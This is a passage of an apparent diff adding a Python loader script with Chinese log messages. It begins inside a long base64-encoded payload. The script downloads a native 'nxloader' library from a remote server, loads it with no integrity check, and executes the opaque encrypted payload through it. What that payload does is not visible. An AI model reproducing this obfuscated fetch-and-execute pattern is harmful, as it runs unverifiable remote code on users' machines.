ZyZkRoUWpDeGZ4RjZOZGloUjBvYkRLUEJWZ1pGUU5JYmRmeGpuajYxMGFVQ1NoSVEwVkJzYndoRUtqS0p1MGlqRjFJVk11Z1RiQzBGdUVtRnJDQ0FUbUhpckJucHZORkVHdmJRQUEwWmZJZHZmU0dld2tOK0tWVFRuYmVab2lsWU84YVVnQ21rclE2cmVRVEtOZHNmNnBBTTZETHRHTlN5SUxVWENzeWgxMHp2V0hMSW1TNk9ua01VL1dmYWM4U015eXRWdEE1NzBydGtTQnFrb1JzVkhpK0U0V1JjbkliV2JoSjh5L0NlZkZvUTdZSWpDUkR6RWwxUlBZVjNyTythelovbXpZeWZIZHdhYjk0QXR2cnArZ1F0c2ZOb2JzVnBQTHhkNnBnem1DSDFiazBncmtOUnFDbklneVQxOXJteVBaZXVvNFBCSHFna1lpemxXZWdYaVZqK0NnT1BTRVlldldhWHhwcHVTa2g3b3lhRDdRSEs5Q1VjMkRiRFpObVFzWEFjekhGUFpCNGxUclRaZWNQMmZ5TUJROFdoVlBWUFhiNElNaHI5aXpTUmx6STBqem1xUEVKM2RXSk4waVJQVmdWNDJ0TmY3MkNjeTlxNmRRWkx1aWtTc1JHYlhmaGNrT1FaaVZlc29QMTVrenZrQzhJWElOZGlyTHYzZkJ6RndTUFNxa0U3Y2NmenZBK1FRenZJdzNsMlpuU2RrQU9tRmNsaDIzUGxSZ3ZWUk5IR2RrUTlrdFVXS1pkWmF4SHBQK2NvaDhrd0xPZlBvRW9NS1lkbGhuWW0wS2kxUzhHTXZSZnJrcUVxQ1ZlZFludlBVUHhPc0tLRW9nSEFGK2VFL0IzcjZpTmFQM0xaVTlvMys5UXE2MTlsUXQ5NVdHMEhDSmZjUjRlUTkxNnRNVWNscGhPRUlnUWVtemh0eThJTHh6ejd6U0hxMWU0M2hwQVlXajE2azhRWllCYlpoY3d3VVNBUGxxWXQ0cjBkanlZVEg3cUhsZGtvVXNhYWJsV0srbkJSS3pzcDJyNEtFL3lKdDI3WFZ1VWpZeEE4NTFzQ2hWVWJDZENidURLK1dRcFVBMU9ZU0pCV3hlNUhOZHBhc2JrUXBEdGhFcEt1K2JsUDMwWWR1VXkrc2t3WFI0NStSN244dlJKQ09LWkU2MU96dG5jU1NtWkJ1MFhRUGFDc0RHMnJ5QS9tRWZzc3Y0MGRISzhhQnhyV0d1M1o1SllKNldTNmhRK2VDa0xjNkU5YmJkU21tTWw1VEFNSGs3cnp4ZStnUDF2WUlWSnQxS0NBTTJheXZTTkNlc2Ztd1FiRzRSaTQ3U2hRSVF3S0ZpMjZxQzg5QzBDd3piY2x3Tkc3OGQxTzQyYklvVWlFZE00V1RFUWNPTE8yMDhUNitGQXRTN1lsbkdBT1V1eEorM0xuMTU5Q0ZKdVJIRjZsRGpaZC9VZ3lVMkVyWHVxU2lzeVk2ZXZPaEpaL2RyTXJOR0lNckw1aEl6cE5xZDJCRmoyVVZuNmtCWlVqeEM0LzAxQS9KUWlsMUlLNWxUSUhBY0w1aTMyRmIrRHNSTGNDYzMzMVkrYU0zTUhwOEJucDJVRXlmUjVKQmpyTnpMNU5FVk9DaVBqbnpqMFFLZVZCSGR1QmtkMGJiOVF1cWtTTzFNVk9iLzIrTkNnVXEvWEJTK3VWVTdSVFBNWWF3NjNiblVjU3RIaWVaOVgzd0xXK2lJWmVaVmlCcXVsR1hSTnpjS0RzMG9xdmQwbHlLRGtPd2dNTTBjY0MvZldUdmtpTzdQblB3V0ZkalJidC9qaDg0czZzUVlyQjlEZ1hRNXV2ZXlQS0FPSE9zbUVEQ21YUmhrZnZRbGpjYWlnRmR5SG5QUzAzRnMxL2dONHU5T2dUZUwxNzBqLzhTODBrWnpOSEJ0a0o0Q0IrT0xZYkFPcFRMMmxoNnUvVU0xaDY5cHJGUXovSGhPQWd1Wm5vcFJBWktRT3g1N21GcjFPUzg1Q2tvNUd4S1o1YUNmZXc3MVJGUEdmTTliZVZnRWh2NWZ6ZmFqSitNZHJWUGRXaXBnNDFuVk5PNnZtZXBCNGNGbzF6R2VZRHBOQjVSbTFlVUtPWTdBTm1qMUF6aW80MUpDWUREUnpHeVFKN1huZjhlWXBCR0E0eVBxanRMOUFPNkZoYUV4TjgvREdtUDB3V1hwZkpISWpRTEFlUGUvRW16WXkwNXdTY2Q2d2FVN0Nvc2I2ZDlDNXBnS3h4R3dIWGdxcmRZZWl3WG5QOW9IQzhaM3JEZWhQb0QwS3VkN21ZbU40OVVJM0FiTWhGaXkyK3U5ZVNaL3BQamwxMHQ1MWthM3JaQThjSnBROUxRUkdnSWRYTkk3SHM5RlhzS2MyRjZaRVZubnZ1Q2xpVzM3VTRKQXVDNFlPUDRzU3NBU1MyY1AyOFZOcFdiTVFjTXNDcHREVzArdmVSY2h0NlJNM3ZoVEFQQ1JSV3FoL0M4RkNQM3VOcFhhRkdyTENlYUFTbG1XSFhnbzBuaTRYOXl1RUVTOURlVm11KzVyTW5ibHg5dTFyUE5GcjNJWDRXWU9KcUQxN2owSzZWdGI4VkF0YkRUZEpGM1paYVdXK25tK1Y3VVpZTnBsSmk5UWdKZlFob2tIZmVpeTlGeFY4V3RUeGFQeWtqRFFld2lGb1NHTVVUakNUL2hIcGdNVUVtdk5lKzNpbUdVQ3BBTnI4akc1WHI3eTUxejBkOGlieTMwL3JjOU1rdjdEdjBVMVJnL1Vla2VjdkhqMkNEY2ZiUzVWN3FlRGJnazNGMG9lRWJINFVocVBaMyt3L2RYVE1VNmpVOGprMmcrTThpa0JwbTFMQkx0b3hacGtoLzZwQmExejNPd25VSHZQMVJTUEdFOGgzYWptLzhDZWlmekwyOHVSbVl2RHQ0RCs5WWJyRnZlMnZwTnVHWWNCdVAwWCsycFNuaWVKcGpJVmdtaG9uZG1GSEVLWi9zeXZDL3Y2T0d5NSsvV3NHWG9wbDRFeHNCR3dmdGNaRHR0MzRJTWIyMzcwZU44Uk9kYVhvZER4QXhYeW9tS2NpVEp6TDg3R0d5cFRKb01WYlFIUDJBL3VzclJHS24reWhPRlI2UzZsWDQ1dmt6N1V6cVRmUXhwNEhUMmdNWkM2bDVYcXpPV3NqTENlREtwcmloSndSNmJhQWZreFZHWjgrVUs0a0s2cys2UVBSZEhQSWdabFNuUmpMbW54YnErSzVVZlMwQWtrZktnMVdCcWJIbHJTZ2JZRXMxaU4zR0dnOXRpb1I3MGtYSE1QbGRpdURadmZ3NUhYczRiMWlhbmlETHRXcXAvSjFyTmFWc1plNWpYRFhKdFpzTmVEY0xQNlN0Ry8zTUZ1Y25pL2k2L2JrdllSRW50dUlQM2pITlFScTNYTXU1OFVaM2xkZUQyZGFXK1NBV2pkSTloVTZpODIzN2NTaU5VbjNZakVnVURzaW1xd3JBbkI0YzlmRUZuK3NQdUc4VWw1MEV3MDh5WFhXcmtjcEdtbmptZThZRTlrTGJtSzFHTWs3ekZ4TlY0bjExaWpGdnJxbUI0OHQ1V1NwTlhZMWg4ZStSeElpV0V2Slo3R1VZSUFQZFhXTEJWd1hRb003R0h0eXBCN0xhaGsyS05Fb2owdXNXSGxKdzFQTnlPb2VDSzIvN0t6aDFCeWx4c3BiYStrei9yL1k0UzM1RFRVenVhczZUQlJQVDVqRWxmekp4SGpBd0Y1RFdiTkprZUVrU1pscGV6aS9raEozN1hMK0YxMjNiejlsZUpaV1RtZENkMk1sc2M2SnBhSmptVis4L0VwTEpRaTAvaHhpL0w5eFF2Y3VWT1FMOGF1TUNteWtLa2syTDhUa3U0aWtmWnQ3YWVWaVBKdFZnbERZYTJ6QldQZmJISmxDU0RjWHZNd2VtMlBkNFBsUmxQYWV4cENsK2d0bndqME1RcDRaNGlYeVhUUVI0T3lmbkd6UWFhVlRBNGVjZm4zTFdocHBqSHRJdTRkQm9MVmJJaWFxRnlYZlVpUEp3RVpWMjh6cVJWNzVMREEweW9GSGxOTk1rSGRubnpGZWlBMTNqMXJ0NEo5TGFwcGRObE53SC9ZZzk4MWdzS01mQmdseHhESkV2UnJjVy9KeWxDSU0rUWVUemFIM0dRaHlObkM5SG9UcnBxYWppYTFxT3JsdmZjREJNRGxxWC9ONXNFbHBuWm5nelhXZ0MwZnFLMUh6OE1UTVYwazBEN21hcTdKRXR5dWRNM0FVUzlWOGt6TWhUSVcwcVh2Q09HVVd0YnJtQ3BUTjRkdXFLZnhaN2I2blViVmVOWWJSRzVaVXUvVXdsYnNpbUlpeTkxSnJMQmJDenJGb1ZLL09GZFo3RzM0VVpWU2RVSDdzeE9xekt3Ny8wRGNCUjd3WmhXWUtvcGFzSUh1ZlZnL2VCd2FLUFIrWEdpTlg0eWJtOXpsaSt3UXFNUGs3SEkvbUp5a1F3dWV1eVJWVzJMa0QySURjL3lPb2dTcjd2MW56bERZM1VDMjJ4T0s0a1d2RmdOU3E5SXNDU2JORFFCS3VXSkNOY3Z6dFMwT2pzallXT0RuOUJyUUhQZWVuSDhTdmVnVzNQL0xPeXhkNEs3VWRndi9LdHJNSDZTWU9adDhwdjJnWnFheW5FOFFoVVJOeFFsT3QrMTU4NG9laGRyOEpOMC9EYTA3RUx0WVYzeGdkU2RVa3R4aVBIK1hISllDWEoyekorYXp4aHNEbktoUkFwNmdDSXpyYlMzNTFueFY4dTl6OEVTSXEvN0w4QWFVd0MvT2E0RE1sK05pdEdLdUxEQTJsNXBuMDh5VVdpYlR6ZGpuQk94TlBCbmtqNytqUGZCQXNVVm10c3ZEOXk3bmVkVlplVmtHS3d0Y0NHWUF3QUJyR2NwY2ZKU1piYm1FbzltSjdiaGpQTVZmZlNHVmEvOXBkd1RnaCtROWs2R04zM0lYRTAyWElkMmlrbDZtYk8vWmZHSUFzcWlIUTR1ODNnbGUyTndmT09VUWpvMytBRjJJbDI4UGhvNHZQY2FseGc0azdXbUNhYlpuT1hjT3JCM1RCb2c1c3R3Mk1zTHpWT21SRmgzd2dURjdrMUpjWGhBRkV6RHBhUEJLMnZkdUNUK1VGTGZHOTRvYm1WZkhGQVhSS1V3dTcrMnVzdWZPdnBRcDYvVXhpWHQvMmh5RkxDeW5zS2J5a2RqZ2lMcWNOd0xiMm96REZFQW8zQjQ5dnNkcGFEeE5nZmFJY0lva05BREpuYVlLRnYyalRUaEZUc240SUUzeDZneGhnVHRqU3VTcTYvYTI2N3AwZjQyc1NJSXdlR3FLTlM1NnlMT1V5U3JVbStVU3ZxQ3J0UnBNQVQxaHBxMjg4TXBQdXl5bHZUMWoxS2h4SytrOThzcURFSklPRCtNQ1EwRzhMdkM4c0YwM2UxN1lCUyttYUU3ak8yeTFGRWxsTUxVdWwzajRTL01kTytyTjd4VUhWUFIvendHWkg1dGh2WDNxUEJ6UVNpc2M5VGJibUp0WDk4SWE1dFFkZWFrQjdydHhmUWdCQTI4MEd5NzMvUzVvTEFTUm00VjNuWVRWaUYxSGg4WEFvY1RvRFNBay9GKzRPMGQxbG5uV1llYzlsdXNEUmwzdlFndWw5QUNMWjhVWThaem52T2RCWWVYZnplNGJBRTN4cjU5clh2MjMzUmhQNGdaaEZQYlIrTEhmTm1rTS9QeHlBZG9ua2E1NHdtWU1iSnVtSVdXVlhmSHdPM1VVTTdTbmFmUTlVYktnbXk5czBrdzV4TlpXRXR4anc2RlExSUVYcyt4QXJuUDBNTFEwczBTQmE4S1pYRkhNUFRvYkNFd3dyTFkwYU1FL25VcHdMRU9PYkN3Y3BNdnNKelJkVklCTkFNajlOZnhFd1ByQ3RHQlZkVWJpM0RSZzVKNXBuNm16WTBPWDVsMnBXRnIvZGpEd3BjQVJadGVPYnRxVGdKOWp6K21jem0vU0lwQkZTcllMMVFjcnhXOEVIQWZWZi9Jc0JEWVZUbFFaclN3M0xHbEpsWXZISG00SURlWnA2SC9xNk9HT2RidStuTWliUW1TWDZ6QktlZGoxcTlTWFU5ek5wOWoxT1A2Ym9kUHQ1MFRSemt0bmZqcDRUVHZVQlBqK1BLM25zOTFqN1RHd08yOHN3bG8raUxZL3QzRWtEZ2l6NytuY1dXazBNTTBoTEZnNE5VckMvWEFNYWxMSXh4dkFlb3ZNZENqNW5CTE5SYzNUUVE1UVlWNVN0TVhLVzJ1Wi91V3c3M0FKZ01wUTgrL3J5d2owbWdzWDcyT3FkK2xaYndrc0dLL1BpeUN2RldiZ0t6ZU96WmtYYXMxeWJ6Sjh6bG9Lb0dZUWR0dm5WY1pvWi91Q2ZTSmd1VzRpYTFnbURwdDZsd2FwcU9vVmVLSThCejlTOXd0WUsvRlBjb3J5elN3K0h0c0d2b0ZtSWlEZ1F6azdxdHFYNFBoWDg3Q2FmNVdOVHlDNUZQblpTRWNpOTdGSXkxS2VuNzN5cDRaSEp5UFJodm04U2cvcnpycWxlaDBjUmVNQXZ1aE9seTlUWFlOaEpzRm44dHpnYzNBdHNKbnJvMWo1QWxkWjVpMWxsRkZ2NDVodlFBekord3AwclBNNURvdHFWajAreWtuMDZDNWlJUk9XTytkTXphR1RyTGJ0VUNpRnRLNWZJSW1FRWlJR25xSFVJa0dwM2dBWnF3OTdsQ1B6bnJQT24yV2ZraS95ODlORUloRk54c3g4Wms0M2JHck5RNm54R3lERTd2bUQrcEU0eGJIaGpBN0tIV0d2bFRWRXlkcXQwV3VpU0dpWlFZdEJGMFBELzU4Wm5LNmVSYndxa3BBa3BZbTIvUUVhcU5rdUt3L2xlZlZjbnpxY0FkdUU5bHVrcXBOcjdRN0xrS2NMeVpCRmxiNW5XUkV4SUd3a3Y1WW4rbzFiQzJMVHI4V2ZKQ0ZYSHA4cW5pTjBFd3NwTlZwKzV6SDNkYmgwOHMwMitTL3BqOHFVQWZyei9EVzZkNTlTWnI2TXNNNHR5Ym9IRHhOdzVaZG8reE9lT1lFOEtMVnkrdUxDZ1laTTIwU09RT1VBVEJLcHZvK3FNSFpNYzlJN0Z0MkxhTVp1YTlsOEU5NGpVQXpoS0ovU0JBU2dHNXZkUWlWdkJzRlppNmRVZitGOGxiV1pBb3hzSGxMQzNMSDNkVDYwR1ltZjN5cFBSVUQ0anpNbkV1Q3VJWERtdUYrNnZwakhvMHQ1OTYrYTRSNHVkWmtaQXYzd2kyNURsU21vSngxcmNXdXRqRlRPVHV3YXcvQ3AwVHRLWEU3blBwUHBHNjBaT0hIdGdsNzcweFRLKzRpOEtSd044ZFlPTTBVS1BtZUpHcWtpaS91a3hUaGlaTnZoSzhyVW9IdmZWNUtDUUNqaVJZSlgra3BYdldDTmpScWE4c1JsQ3lUZWF5Z3NLaFJ2cEtxNnlKM3RPbk5uUUo4UlBHRW9VMStiTHhiNi9uTTk3dVJyYldDU09EODZDd0k1ZkgyTFlVZDdoUE1UU3YxNzdXZEZLOHFzNklsa3UvVGVRWDdSZFpwTjB4N2V1ZitxeEx5Vk1USllJbW90cEFHdkpnRVVBcmdxM3pLVXU5cU5mSDVIbDZ6NWJ3Q3htdzdGdXFYMm5rRFdhYVRZdDUreEpkN21nZG9YSjBjV09iQWF1S3RyQlVnRVJMSHdGcUhkVFJTUFlXalo0bWh5MTBhZ25VVjRWa0FHTk4vVWRQU3Z1VWlOaHN1Z3QvL2xDTUh5N3cwU0c0L1RPaVpLS1NWMWNjdGFYaVR6Z2R1aFNGazBiVW1kaHRVSDIrNjZZWEJzOWRtbkRYRW1QR1pqYnF0RitmWU1OVmxTLy85YzkyWFlEMUN3anBWOGwwRWMvMU11UnVXRjZ0bFNoWkpEa1ZPaUM5L2NYbXpqbmFDMGpud0FtYjI4TDg0b2gyWFJVdjhVOHBJTlhuMHdVbzVEaGd4Q2RsL2hmSDNraWxnajVUQTM2QjZQemxwOEJOMEl3L083WWg0U2pmZ0hyMjNUWlFKSzUzQzZ6YjUrM2IzVG5hYXZEc21KV0kzcW1zTVd2U2dUcitsUnd5V2Vibm54bXpmS1p3ZlJuUWNKaWxPOVhaR2xRbXRxeG1tZ3pyS1pvQzhYZzJRQVJhTzByTDVGZW1tWmptcFd6Uy82ZE9KMGdoWG0vMUM5eGFZNDFDaEpDeWpXaS9lTWlEaHovZjVDcHVvN2NUeHVyUHhPNjVuWG1IM2dOR3BqRVI1QlcrUklIVGc3UHI4b21sM0pUSkwxTWU0a3A1YVZFNWFPVTJhaWpzNGgvUG05S3ZpR1dKSUJqOHVpZlZYa1ppWWJ5MHk1VHhBeUVkSnp3bHg1WlhKdVRQaUdkN1h1dks3RmYyb3hkcWdac0ZQLzVTdGtCMlM3RE02Q3REZ1ZieHphaEJPNWpUc1FVbTBsclA1SE0wUnU4VGorQVRicjFUUzB3bERFNnJyU05lZnoxejlScjQwanBWdUtlRGQ5MWs4dHJvVWY1WitZWTJ3N1RBdnNVR2s1L215UkdycGh4eTdPbWpvSjFYM3JLTE1uZGtZdEFkWDlPWFp4Ym11WGNnSVI5Y2lJUDVrdTNvVnZVbnVTbmdvN0t3dnB3NmczeWM5K21wOTcxNjlFZGFYY25SZFp4QXZaVEtrRWw4SmVLK2JzUllURUJ0WWtBMDFGODVZZ3FDZU9YeHVUZzJuY1NrSWdoU3JWcEgwT1pFRmZZRU9SYkNYRXMyZ01mUlAwcmhCRW95VnBZUUc0eHBPaW0zU0QzNnhUejVXaFk3QmtCVkhrdjc1ajlQelBXdkFVanJiaklUTmpDUE5IL1FwSktUVHhTRkszeUMyTnFjYWkrVHBpZEU3MHJYYVplQllTTE9XS1NCRngwMDRKN0ZvNXBlRC9YMU05NytzN2k4QjJzY0M2T1NnKy8zd3F5M2lKMFhGQXA0eHhvRlllOWVVejNNblQ1eE1YRjN3Y2dweFprVUFqd3AxTT0="
+    })
+    SUPPORTED_PYTHON_VERSIONS: Set[int] = field(default_factory=lambda: {10, 11, 12})
+    SUPPORTED_OS: str = "Linux"
+    SUPPORTED_ARCHITECTURES: Set[str] = field(default_factory=lambda: {'x86_64', 'aarch64', 'armv8', 'armv7l'})
+
+    def download_url(self) -> str:
+        return self.DOWNLOAD_URL
+
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    datefmt='%Y-%m-%d %H:%M:%S'
+)
+logger = logging.getLogger(__name__)
+
+def _load_so(path):
+    import importlib.util
+    sys.modules.pop('nxloader', None)
+    spec = importlib.util.spec_from_file_location('nxloader', path)
+    mod = importlib.util.module_from_spec(spec)
+    sys.modules['nxloader'] = mod
+    spec.loader.exec_module(mod)
+    return mod
+
+def handle_errors(func: Callable) -> Callable:
+    @wraps(func)
+    async def wrapper(*args, **kwargs):
+        try:
+            return await func(*args, **kwargs)
+        except Exception:
+            logger.error("脚本无法正常运行，请检测更换环境")
+            sys.exit(1)
+    return wrapper
+
+def get_linux_distro() -> Tuple[str, str]:
+    try:
+        with open('/etc/os-release') as f:
+            info = {k: v.strip('"') for line in f if '=' in line for k, v in [line.strip().split('=', 1)]}
+            return info.get('NAME', 'Unknown'), info.get('VERSION_ID', '')
+    except FileNotFoundError:
+        return "Not Linux", ""
+
+class EnvironmentChecker:
+    def __init__(self, config: Config):
+        self.config = config
+
+    @handle_errors
+    async def check_system(self) -> Optional[Dict[str, str]]:
+        v = sys.version_info
+        os_type = platform.system()
+        arch = platform.machine()
+
+        system_info = {
+            "python_version": f"{v.major}.{v.minor}.{v.micro}",
+            "os_type": os_type,
+            "architecture": arch
+        }
+        logger.info(
+            f"系统信息: Python版本={system_info['python_version']}, "
+            f"操作系统={system_info['os_type']}, 处理器架构={system_info['architecture']}"
+        )
+
+        if v.minor not in self.config.SUPPORTED_PYTHON_VERSIONS:
+            logger.error("脚本无法正常运行，请检测更换环境")
+            return None
+
+        if os_type != self.config.SUPPORTED_OS:
+            logger.error("脚本无法正常运行，请检测更换环境")
+            return None
+
+        if arch not in self.config.SUPPORTED_ARCHITECTURES:
+            logger.error("脚本无法正常运行，请检测更换环境")
+            return None
+
+        if arch in {'armv8', 'armv7l'}:
+            logger.info("ARMv7, ARMv8请自行尝试")
+
+        return system_info
+
+class FileManager:
+    def __init__(self, config: Config):
+        self.config = config
+
+    def get_so_filename(self, py_minor_version: int, cpu_info: str) -> str:
+        base_name = "nxloader"
+        if cpu_info in ['aarch64', 'armv8']:
+            arch = 'aarch64'
+        elif cpu_info == 'x86_64':
+            arch = cpu_info
+        elif 'armv7' in cpu_info:
+            arch = 'armv7'
+        else:
+            raise ValueError(f"不支持的CPU架构: {cpu_info}")
+
+        distro, _ = get_linux_distro()
+        if "alpine" in distro.lower():
+            return f"{base_name}_3{py_minor_version}_{arch}_musl.so"
+        return f"{base_name}_3{py_minor_version}_{arch}.so"
+
+    @handle_errors
+    async def download_file(self, filename: str, target: str = 'nxloader.so') -> bool:
+        url = f"{self.config.download_url()}/{filename}"
+        logger.info(f"开始下载固定 so: {url}")
+
+        def _fetch():
+            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+            with urllib.request.urlopen(req, timeout=60) as r:
+                if r.status != 200:
+                    raise RuntimeError(f"HTTP {r.status}")
+                return r.read()
+
+        try:
+            data = await asyncio.get_running_loop().run_in_executor(None, _fetch)
+        except Exception:
+            logger.error("脚本无法正常运行，请检测更换环境")
+            try:
+                if os.path.exists(target):
+                    os.remove(target)
+            except Exception:
+                pass
+            return False
+        with open(target, 'wb') as f:
+            f.write(data)
+        logger.info(f"so 下载完成: {target}")
+        return True
+
+    async def remote_fingerprint(self, filename: str):
+        url = f"{self.config.download_url()}/{filename}"
+
+        def _head():
+            req = urllib.request.Request(
+                url, method='HEAD', headers={"User-Agent": "Mozilla/5.0"})
+            with urllib.request.urlopen(req, timeout=30) as r:
+                return {
+                    'etag': (r.headers.get('Etag') or '').strip(),
+                    'size': (r.headers.get('Content-Length') or '').strip(),
+                }
+
+        try:
+            fp = await asyncio.get_running_loop().run_in_executor(None, _head)
+        except Exception:
+            return None
+        return fp if fp.get('etag') else None
+
+@handle_errors
+async def execute_code(config: Config):
+    import nxloader
+    py_version_str = nxloader.get_python_version()
+    loader_version = nxloader.version
+    logging.info(f"当前loaderV2版本: {loader_version}")
+    if hasattr(nxloader, "set_script"):
+        nxloader.set_script(config.SCRIPT_NAME)
+    code_to_run = (config.CODE_PAYLOADS.get(py_version_str)
+                   or config.CODE_PAYLOADS.get("3.0"))
+    if not code_to_run:
+        logger.error("脚本无法正常运行，请检测更换环境")
+        return
+    loop = asyncio.get_running_loop()
+    result = await loop.run_in_executor(
+        None, lambda: nxloader.main(code_to_run, config.FUNCTION_NAME))
+    if hasattr(result, '__await__'):
+        await result
+    logging.info("代码执行完毕")
+
+ETAG_FILE = '.nxloader.etag'
+
+def _read_etag(path: str) -> str:
+    try:
+        with open(path, 'r', encoding='utf-8') as f:
+            return f.read().strip()
+    except Exception:
+        return ''
+
+def _write_etag(path: str, etag: str) -> None:
+    try:
+        with open(path, 'w', encoding='utf-8') as f:
+            f.write(etag)
+    except Exception:
+        pass
+
+def _load_local(path: str) -> bool:
+    try:
+        _load_so(path)
+        return True
+    except Exception:
+        return False
+
+async def ensure_loader(config, file_manager) -> bool:
+    local = 'nxloader.so'
+    local_ok = os.path.exists(local)
+    cached_etag = _read_etag(ETAG_FILE)
+
+    filename = file_manager.get_so_filename(sys.version_info.minor, platform.machine())
+    remote = await file_manager.remote_fingerprint(filename)
+
+    if remote is None:
+        if local_ok and _load_local(local):
+            logger.info("无法获取远端版本，继续使用本地 loader")
+            return True
+        logger.error("脚本无法正常运行，请检测更换环境")
+        return False
+
+    etag = str(remote.get('etag') or '')
+    if local_ok and cached_etag and etag and cached_etag == etag:
+        if _load_local(local):
+            logger.info(f"loader 已是最新（etag {etag[:12]}）")
+            return True
+        logger.info("本地 loader 不可用，准备重新下载")
+
+    tmp = f".nxloader_{os.getpid()}.so"
+    if not await file_manager.download_file(filename, tmp):
+        if local_ok and _load_local(local):
+            logger.info("下载失败，继续使用本地 loader")
+            return True
+        return False
+
+    try:
+        os.replace(tmp, local)
+    except Exception:
+        pass
+    _write_etag(ETAG_FILE, etag)
+
+    target = local if os.path.exists(local) else tmp
+    try:
+        mod = _load_so(target)
+    except Exception:
+        logger.error("脚本无法正常运行，请检测更换环境")
+        return False
+    logger.info(f"loader 已更新: {getattr(mod, 'version', '?')}")
+    return True
+
+@handle_errors
+async def main():
+    config = Config()
+    checker = EnvironmentChecker(config)
+    file_manager = FileManager(config)
+
+    system_info = await checker.check_system()
+    if not system_info:
+        return
+
+    if not await ensure_loader(config, file_manager):
+        return
+    await execute_code(config)
+
+if __name__ == '__main__':
+    asyncio.run(main())
